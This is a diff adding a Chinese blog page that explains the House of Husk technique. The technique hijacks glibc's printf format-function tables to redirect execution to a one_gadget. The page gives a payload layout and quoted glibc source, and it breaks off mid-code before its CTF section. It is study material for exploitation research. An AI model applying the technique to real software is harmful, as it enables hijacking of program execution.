@@ -1,0 +1,1055 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="本文参考了下面两篇文章\nhttps://xz.aliyun.com/news/14821\nhttps://zikh26.github.io/posts/6c83c2a2.html\n介绍:house of husk是对printf函数内部进行注册自定义格式化字符串函数的指针进行劫持，glibc 2.23-2.35该手法均可用\n">
+<title>House of husk&amp;&amp;34c3CTF readme_revenge</title>
+
+<link rel='canonical' href='http://localhost:1313/p/house-of-husk34c3ctf-readme_revenge/'>
+
+<link rel="stylesheet" href="/scss/style.min.84466b97fc2839f50008967839ac7e52db98eefba6b8d2a771a97db8f36059e7.css"><meta property='og:title' content="House of husk&&34c3CTF readme_revenge">
+<meta property='og:description' content="本文参考了下面两篇文章\nhttps://xz.aliyun.com/news/14821\nhttps://zikh26.github.io/posts/6c83c2a2.html\n介绍:house of husk是对printf函数内部进行注册自定义格式化字符串函数的指针进行劫持，glibc 2.23-2.35该手法均可用\n">
+<meta property='og:url' content='http://localhost:1313/p/house-of-husk34c3ctf-readme_revenge/'>
+<meta property='og:site_name' content='fuguang&#39;s storys'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='pwn' /><meta property='article:tag' content='House系列学习' /><meta property='article:published_time' content='2026-02-15T00:43:28&#43;08:00'/><meta property='article:modified_time' content='2026-02-15T00:43:28&#43;08:00'/><meta property='og:image' content='http://localhost:1313/image/husk/House_of_husk.jpg' />
+<meta name="twitter:title" content="House of husk&&34c3CTF readme_revenge">
+<meta name="twitter:description" content="本文参考了下面两篇文章\nhttps://xz.aliyun.com/news/14821\nhttps://zikh26.github.io/posts/6c83c2a2.html\n介绍:house of husk是对printf函数内部进行注册自定义格式化字符串函数的指针进行劫持，glibc 2.23-2.35该手法均可用\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/image/husk/House_of_husk.jpg' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_c17c68125d7ac105.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">fuguang&#39;s storys</a></h1>
+            <h2 class="site-description">Welcome ~</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/fu9-dotom/fu9-dotom.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#原理">原理</a></li>
+    <li><a href="#利用方法">利用方法</a>
+      <ol>
+        <li><a href="#relative-overwrite">Relative overwrite</a></li>
+      </ol>
+    </li>
+    <li><a href="#源码解析">源码解析</a>
+      <ol>
+        <li><a href="#__register_printf_function函数"><font style="color:rgb(102, 102, 102);">__register_printf_function函数</font></a></li>
+        <li><a href="#printf-vfprintf">printf-&gt;vfprintf</a></li>
+        <li><a href="#vfprintf-do_positional">vfprintf-&gt;do_positional</a></li>
+        <li><a href="#do_positional-printf_positional">do_positional-&gt;printf_positional</a></li>
+        <li><a href="#printf_positional-__parse_one_specmb">printf_positional-&gt;__parse_one_specmb</a></li>
+        <li><a href="#__parse_one_specmb-anyaddr">__parse_one_specmb-&gt;anyaddr</a></li>
+      </ol>
+    </li>
+    <li><a href="#34c3ctf-readme_revenge">34c3CTF readme_revenge</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/house-of-husk34c3ctf-readme_revenge/">
+                
+                    <img src="/image/husk/House_of_husk.jpg" loading="lazy" alt="Featured image of post House of husk&amp;&amp;34c3CTF readme_revenge" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pwn/" style="background-color: #2a9d8f; color: #fff;">
+                Pwn
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/house-of-husk34c3ctf-readme_revenge/">House of husk&amp;&amp;34c3CTF readme_revenge</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Feb 15, 2026</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><strong>本文参考了下面两篇文章</strong></p>
+<p><a class="link" href="https://xz.aliyun.com/news/14821"  target="_blank" rel="noopener"
+    ><strong>https://xz.aliyun.com/news/14821</strong></a></p>
+<p><a class="link" href="https://zikh26.github.io/posts/6c83c2a2.html"  target="_blank" rel="noopener"
+    ><strong>https://zikh26.github.io/posts/6c83c2a2.html</strong></a></p>
+<p><code>介绍:</code>house of husk是对printf函数内部进行注册自定义格式化字符串函数的指针进行劫持，glibc 2.23-2.35该手法均可用</p>
+<h2 id="原理">原理
+</h2><p>执行printf函数时，<strong>__printf_function_table</strong> 是否为空，来判断是否有自定义的格式化字符，如果判定为有的话，则会去执行 <strong>__printf_arginfo_table[spec]</strong> 处的函数指针，在这期间并没有进行任何地址的合法性检查</p>
+<p>那我们如果劫持<code>__printf_function_table</code>非空，劫持 <strong>__printf_arginfo_table</strong> 使其表中存放的 spec 的位置是 backdoor()，在执行printf函数时就可以劫持程序执行流到backdoor()</p>
+<h2 id="利用方法">利用方法
+</h2><ul>
+<li><font style="color:rgb(36, 41, 47);">__printf_function_table</font><font style="color:rgb(22, 18, 9);"> 和</font><font style="color:rgb(36, 41, 47);">__printf_arginfo_table</font><font style="color:rgb(22, 18, 9);"> 分别写为 </font><font style="color:rgb(36, 41, 47);">chunk A</font><font style="color:rgb(22, 18, 9);"> 和 </font><font style="color:rgb(36, 41, 47);">chunk B</font><font style="color:rgb(22, 18, 9);"> 的地址</font></li>
+<li><font style="color:rgb(22, 18, 9);">设占位符为 </font><font style="color:rgb(36, 41, 47);">α</font><font style="color:rgb(22, 18, 9);">，此时 </font><font style="color:rgb(36, 41, 47);">chunk B</font><font style="color:rgb(22, 18, 9);"> 的内容应该为 </font><font style="color:rgb(36, 41, 47);">p64(0) x ord(α-2) + p64(one_gadget)</font></li>
+</ul>
+<p>spec是格式化字符串，比如最后调用的是printf(&quot;%X\n&quot;,a)那么应该将__printf_arginfo_table[88]的位置写入backdoor(),其中88是ord(&lsquo;X&rsquo;)</p>
+<ul>
+<li><font style="color:rgb(22, 18, 9);">该技巧一般和 </font><font style="color:rgb(36, 41, 47);">largebin attack或unsortedbin attack</font><font style="color:rgb(22, 18, 9);"> 结合起来</font></li>
+<li><font style="color:rgb(22, 18, 9);">还可以使用relative overwrite</font></li>
+<li><font style="color:rgb(22, 18, 9);">还有一个</font><font style="color:rgb(36, 41, 47);">__printf_va_arg_table</font><font style="color:rgb(22, 18, 9);"> 也是可以利用的，但是条件比较苛刻</font></li>
+</ul>
+<h3 id="relative-overwrite">Relative overwrite
+</h3><p>1首先利用largebin attack或unsortedbin attack修改gloabl_max_fast(定义了 fastbin 能够处理的 chunk 最大大小)</p>
+<p>fastbinsY数组位于main_area中，当free一个chunk时，会向fastbinsY数组中写入地址</p>
+<p>2如果修改了gloabl_max_fast，释放是个大chunk时就会造成数组越界从而向两个table中写入堆地址</p>
+<h2 id="源码解析">源码解析
+</h2><p>链条为下面五个部分</p>
+<p>printf-&gt;vfprintf<br>
+vfprintf-&gt;do_positional<br>
+do_positional-&gt;printf_positional<br>
+printf_positional-&gt;__parse_one_specmb(该函数执行自定义格式化字符对应的函数指针)</p>
+<p>__parse_one_specmb-&gt;anyaddr</p>
+<h3 id="__register_printf_function函数"><font style="color:rgb(102, 102, 102);">__register_printf_function函数</font>
+</h3><p>格式化字符的注册函数,实际上是__register_printf_specifier函数的封装</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* Register FUNC to be called to format SPEC specifiers.  */</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span>
+</span></span><span class="line"><span class="cl"><span class="nf">__register_printf_specifier</span> <span class="p">(</span><span class="kt">int</span> <span class="n">spec</span><span class="p">,</span> <span class="n">printf_function</span> <span class="n">converter</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                 <span class="n">printf_arginfo_size_function</span> <span class="n">arginfo</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">spec</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">spec</span> <span class="o">&gt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">UCHAR_MAX</span><span class="p">)</span>   <span class="err">#</span><span class="n">UCHAR_MAX</span><span class="o">=</span><span class="mh">0xff</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">__set_errno</span> <span class="p">(</span><span class="n">EINVAL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__libc_lock_lock</span> <span class="p">(</span><span class="n">lock</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">__printf_function_table</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__printf_arginfo_table</span> <span class="o">=</span> <span class="p">(</span><span class="n">printf_arginfo_size_function</span> <span class="o">**</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">calloc</span> <span class="p">(</span><span class="n">UCHAR_MAX</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">__printf_arginfo_table</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">__printf_function_table</span> <span class="o">=</span> <span class="p">(</span><span class="n">printf_function</span> <span class="o">**</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">__printf_arginfo_table</span> <span class="o">+</span> <span class="n">UCHAR_MAX</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">__printf_function_table</span><span class="p">[</span><span class="n">spec</span><span class="p">]</span> <span class="o">=</span> <span class="n">converter</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__printf_arginfo_table</span><span class="p">[</span><span class="n">spec</span><span class="p">]</span> <span class="o">=</span> <span class="n">arginfo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="nl">out</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__libc_lock_unlock</span> <span class="p">(</span><span class="n">lock</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先做了一个判断 判断spec是否存在ascil码，再判断printf_function_table == NULL 就设定一个calloc来分配两个索引表，并将地址存放到 __printf_function_table和 __printf_arginfo_table中，两个表大小都是0x100可以给0x0-0xff每个字符注册一个函数指针</p>
+<h3 id="printf-vfprintf">printf-&gt;vfprintf
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span>
+</span></span><span class="line"><span class="cl"><span class="nf">__printf</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">va_list</span> <span class="n">arg</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">done</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">va_start</span> <span class="p">(</span><span class="n">arg</span><span class="p">,</span> <span class="n">format</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">done</span> <span class="o">=</span> <span class="nf">vfprintf</span> <span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">format</span><span class="p">,</span> <span class="n">arg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">va_end</span> <span class="p">(</span><span class="n">arg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">done</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="vfprintf-do_positional">vfprintf-&gt;do_positional
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* Use the slow path in case any printf handler is registered.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="n">__printf_function_table</span> <span class="o">!=</span> <span class="nb">NULL</span>
+</span></span><span class="line"><span class="cl">            <span class="o">||</span> <span class="n">__printf_modifier_table</span> <span class="o">!=</span> <span class="nb">NULL</span>
+</span></span><span class="line"><span class="cl">            <span class="o">||</span> <span class="n">__printf_va_arg_table</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">do_positional</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里检查三个table，只要有一个非空就执行do_positional</p>
+<p>通常劫持的是__printf_function_table</p>
+<h3 id="do_positional-printf_positional">do_positional-&gt;printf_positional
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="n">__printf_function_table</span> <span class="o">!=</span> <span class="nb">NULL</span>
+</span></span><span class="line"><span class="cl">            <span class="o">||</span> <span class="n">__printf_modifier_table</span> <span class="o">!=</span> <span class="nb">NULL</span>
+</span></span><span class="line"><span class="cl">            <span class="o">||</span> <span class="n">__printf_va_arg_table</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">do_positional</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">......</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">do_positional</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="n">workstart</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">free</span> <span class="p">(</span><span class="n">workstart</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">workstart</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">done</span> <span class="o">=</span> <span class="nf">printf_positional</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">format</span><span class="p">,</span> <span class="n">readonly_format</span><span class="p">,</span> <span class="n">ap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ap_save</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">done</span><span class="p">,</span> <span class="n">nspecs_done</span><span class="p">,</span> <span class="n">lead_str_end</span><span class="p">,</span> <span class="n">work_buffer</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">save_errno</span><span class="p">,</span> <span class="n">grouping</span><span class="p">,</span> <span class="n">thousands_sep</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>调用了printf_positional函数</p>
+<h3 id="printf_positional-__parse_one_specmb">printf_positional-&gt;__parse_one_specmb
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf_positional</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="k">const</span> <span class="n">CHAR_T</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="kt">int</span> <span class="n">readonly_format</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="n">va_list</span> <span class="n">ap</span><span class="p">,</span> <span class="n">va_list</span> <span class="o">*</span><span class="n">ap_savep</span><span class="p">,</span> <span class="kt">int</span> <span class="n">done</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nspecs_done</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="k">const</span> <span class="n">UCHAR_T</span> <span class="o">*</span><span class="n">lead_str_end</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="n">CHAR_T</span> <span class="o">*</span><span class="n">work_buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">save_errno</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">grouping</span><span class="p">,</span> <span class="n">THOUSANDS_SEP_T</span> <span class="n">thousands_sep</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="o">---------------------------------------</span>
+</span></span><span class="line"><span class="cl">
